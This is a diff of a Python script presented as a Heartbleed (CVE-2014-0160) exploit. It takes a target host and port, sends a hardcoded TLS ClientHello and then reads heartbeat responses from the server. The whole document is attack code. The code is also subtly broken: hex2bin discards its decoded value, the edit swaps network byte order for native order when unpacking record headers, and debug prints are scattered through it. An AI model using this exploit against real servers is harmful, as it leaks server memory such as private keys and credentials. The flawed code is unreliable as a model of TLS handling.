@@ -1,27 +1,24 @@
-import socket
-import pyfancy
-import codecs
-import logging
-import struct
-import argparse
-
-
-def hex2bin(x):
-    x.replace(' ', '').replace('\n', '')
-    x = codecs.getdecoder('hex_codec')
-
-    return x
-
-parse = argparse.ArgumentParser(description='Heartbleed exploit /OpenSSL 1.0.1 vulnerability/CVE-2014-0160')
-
-parse.add_argument('host', help = 'Target IP',type=str)
-parse.add_argument('port',help='Port to connect to',type =int)
-parse.set_defaults(port=443)
-
-args = parse.parse_args()
-
-logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%d-%m-%Y %H:%M:%S", level=logging.INFO)
-
+import socket 
+import codecs 
+import logging 
+import struct 
+import argparse 
+ 
+ 
+def hex2bin(x): 
+    x.replace(' ', '').replace('\n', '').decode('hex')
+    return x 
+ 
+parse = argparse.ArgumentParser(description='Heartbleed exploit /OpenSSL 1.0.1 vulnerability/CVE-2014-0160') 
+ 
+parse.add_argument('host', help = 'Target IP',type=str) 
+parse.add_argument('port',help='Port to connect to',type =int) 
+parse.set_defaults(port=443) 
+ 
+args = parse.parse_args() 
+ 
+logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%d-%m-%Y %H:%M:%S", level=logging.INFO) 
+ 
 hello = hex2bin('''
 16 03 02 00  dc 01 00 00 d8 03 02 53
 43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
@@ -57,7 +54,7 @@ def recvall(size):
         if not new:
             return None
         buf +=new
-        size -= new
+        size -= len(new)
     return buf
 
 def exec_heartbleed():
@@ -70,7 +67,7 @@ def exec_heartbleed():
         print('Server closed connection...')
         return False
 
-    content_type, version,length = struct.unpack('>BHH', hdr)
+    content_type, version,length = struct.unpack('=BHH', hdr)
 
     if content_type is None:
         print('No heartbeat response, server not vulnerable')
@@ -102,15 +99,16 @@ def exec_heartbleed():
 def main():
 
     sock.connect((args.host , args.port))
-    logging.info('Attacking %s on port %d' % args.host,args.port)
-
+    logging.info('Attacking %s on port %d' , args.host,args.port)
+    print(struct.calcsize('=BHH'))
     sock.send(hello)
 
     while True:
 
-        content_type, version, length = struct.unpack('>BHH', socket.recv(5))
+        (content_type, version, length) = struct.unpack('=BHH', sock.recv(5))
+        print(version)
         handsh = recvall(length)
-
+        logging.info("Got message - type:%d and length %d" ,content_type,length)
         if content_type==22 and ord(handsh[0])==0x0E:
             break
 
@@ -119,4 +117,5 @@ def main():
     exec_heartbleed()
 
 if __name__=='__main__':
-    main()
+    main()                                                                                                    
+
